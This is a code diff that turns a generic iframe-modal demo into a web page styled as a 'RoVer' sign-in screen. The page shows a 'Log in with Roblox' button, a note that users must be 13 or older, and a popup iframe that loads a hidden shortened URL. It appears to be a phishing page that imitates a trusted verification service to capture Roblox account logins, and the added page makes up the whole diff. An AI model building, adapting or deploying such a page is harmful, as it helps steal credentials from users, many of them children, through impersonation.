@@ -1,69 +1,184 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Hello → Pop-out</title>
+  <meta charset="UTF-8">
+  <title>RoVer Login</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    :root { --modal-bg: rgba(0,0,0,.6); --radius: 12px; }
-    body{font-family:system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif; margin:0; padding:2rem; background:#0d1117; color:#c9d1d9;}
-    button{cursor:pointer; background:#238636; color:#fff; border:0; padding:.7rem 1rem; border-radius:8px;}
-    .modal{position:fixed; inset:0; display:none; align-items:center; justify-content:center; background:var(--modal-bg); z-index:9999;}
-    .modal.show{display:flex;}
-    .dialog{width:min(96vw,1100px); height:min(88vh,900px); background:#fff; color:#111; border-radius:var(--radius); box-shadow:0 10px 40px rgba(0,0,0,.35); display:flex; flex-direction:column; overflow:hidden;}
-    .bar{display:flex; align-items:center; gap:.5rem; padding:.5rem .75rem; background:#f6f8fa; border-bottom:1px solid #d0d7de;}
-    .bar .spacer{flex:1}
-    .bar a{color:#0969da; text-decoration:none;}
-    iframe{border:0; width:100%; height:100%;}
-    .content{flex:1; min-height:0;}
-    .close{background:#d1242f;}
+    html, body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      font-family: 'Roboto', Arial, sans-serif;
+      background: #232123;
+      color: #fff;
+      box-sizing: border-box;
+    }
+    .topbar {
+      width: 100%;
+      height: 56px;
+      background: #e6007a;
+      display: flex;
+      align-items: center;
+      padding: 0 24px;
+      box-sizing: border-box;
+    }
+    .menu-icon {
+      font-size: 28px;
+      margin-right: 16px;
+      cursor: pointer;
+      user-select: none;
+    }
+    .logo {
+      font-size: 22px;
+      font-weight: 500;
+      letter-spacing: 0.5px;
+      color: #fff;
+      text-decoration: none;
+    }
+    .center-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: calc(100vh - 56px);
+      width: 100vw;
+    }
+    .login-card {
+      background: #111;
+      border-radius: 10px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.1);
+      padding: 36px 40px 32px 40px;
+      min-width: 350px;
+      max-width: 90vw;
+      text-align: center;
+    }
+    .login-card h2 {
+      margin: 0 0 12px 0;
+      font-size: 2rem;
+      font-weight: 600;
+    }
+    .login-card p {
+      margin: 0 0 24px 0;
+      color: #fff;
+      font-size: 1.05rem;
+      opacity: 0.85;
+    }
+    .login-btn {
+      background: #e6007a;
+      color: #fff;
+      border: none;
+      border-radius: 999px;
+      padding: 14px 36px;
+      font-size: 1.1rem;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.2s;
+      margin-top: 8px;
+      outline: none;
+    }
+    .login-btn:hover {
+      background: #c20068;
+    }
+    /* Popup styles */
+    .popup-overlay {
+      display: none;
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0,0,0,0.7);
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+    }
+    .popup-content {
+      background: #111;
+      border-radius: 12px;
+      padding: 0;
+      position: relative;
+      width: 90vw;
+      max-width: 600px;
+      height: 70vh;
+      box-shadow: 0 4px 32px rgba(0,0,0,0.3);
+      display: flex;
+      flex-direction: column;
+      align-items: stretch;
+    }
+    .popup-close {
+      position: absolute;
+      top: 10px;
+      right: 18px;
+      font-size: 2rem;
+      color: #fff;
+      background: none;
+      border: none;
+      cursor: pointer;
+      z-index: 10;
+      opacity: 0.7;
+      transition: opacity 0.2s;
+    }
+    .popup-close:hover {
+      opacity: 1;
+    }
+    .popup-iframe {
+      border: none;
+      border-radius: 0 0 12px 12px;
+      width: 100%;
+      height: 100%;
+      flex: 1;
+      background: #fff;
+    }
+    @media (max-width: 500px) {
+      .login-card {
+        padding: 24px 10px;
+        min-width: unset;
+      }
+      .topbar {
+        padding: 0 10px;
+      }
+      .popup-content {
+        max-width: 98vw;
+        height: 60vh;
+      }
+    }
   </style>
 </head>
 <body>
-  <h1>Demo</h1>
-  <button id="hello">hello</button>
-
-  <div id="modal" class="modal" aria-hidden="true" role="dialog" aria-modal="true">
-    <div class="dialog" role="document">
-      <div class="bar">
-        <strong>Preview</strong>
-        <span class="spacer"></span>
-        <a id="openTab" href="#" target="_blank" rel="noopener">Open in new tab ↗</a>
-        <button id="close" class="close" aria-label="Close">Close</button>
-      </div>
-      <div class="content">
-        <iframe id="frame" loading="lazy" allow="fullscreen" referrerpolicy="no-referrer-when-downgrade"></iframe>
-      </div>
+  <div class="topbar">
+    <span class="menu-icon">&#9776;</span>
+    <span class="logo">RoVer</span>
+  </div>
+  <div class="center-container">
+    <div class="login-card">
+      <h2>Sign in to RoVer</h2>
+      <p>You must be 13 years of age or older to continue.</p>
+      <button class="login-btn" id="loginBtn">Log in with Roblox</button>
     </div>
   </div>
-
+  <!-- Popup Overlay -->
+  <div class="popup-overlay" id="popupOverlay">
+    <div class="popup-content">
+      <button class="popup-close" id="closePopup">&times;</button>
+      <iframe class="popup-iframe" src="https://short-url.org/1ctvF" allowfullscreen></iframe>
+    </div>
+  </div>
   <script>
-    // Iframe content and the “open in new tab” link
-    const IFRAME_URL = 'https://okayokay.com';
-    const OPEN_URL = IFRAME_URL; // change this to a URL you own/control if you want
+    const loginBtn = document.getElementById('loginBtn');
+    const popupOverlay = document.getElementById('popupOverlay');
+    const closePopup = document.getElementById('closePopup');
 
-    const modal = document.getElementById('modal');
-    const frame = document.getElementById('frame');
-    const hello = document.getElementById('hello');
-    const closeBtn = document.getElementById('close');
-    const openTab = document.getElementById('openTab');
+    loginBtn.addEventListener('click', () => {
+      popupOverlay.style.display = 'flex';
+    });
 
-    function openModal() {
-      frame.src = IFRAME_URL;
-      openTab.href = OPEN_URL;
-      modal.classList.add('show');
-      modal.setAttribute('aria-hidden', 'false');
-    }
-    function closeModal() {
-      modal.classList.remove('show');
-      modal.setAttribute('aria-hidden', 'true');
-      frame.src = 'about:blank';
-    }
+    closePopup.addEventListener('click', () => {
+      popupOverlay.style.display = 'none';
+    });
 
-    hello.addEventListener('click', openModal);
-    closeBtn.addEventListener('click', closeModal);
-    modal.addEventListener('click', (e) => { if (e.target === modal) closeModal(); });
-    document.addEventListener('keydown', (e) => { if (e.key === 'Escape') closeModal(); });
+    // Optional: Close popup when clicking outside the content
+    popupOverlay.addEventListener('click', (e) => {
+      if (e.target === popupOverlay) {
+        popupOverlay.style.display = 'none';
+      }
+    });
   </script>
 </body>
 </html>
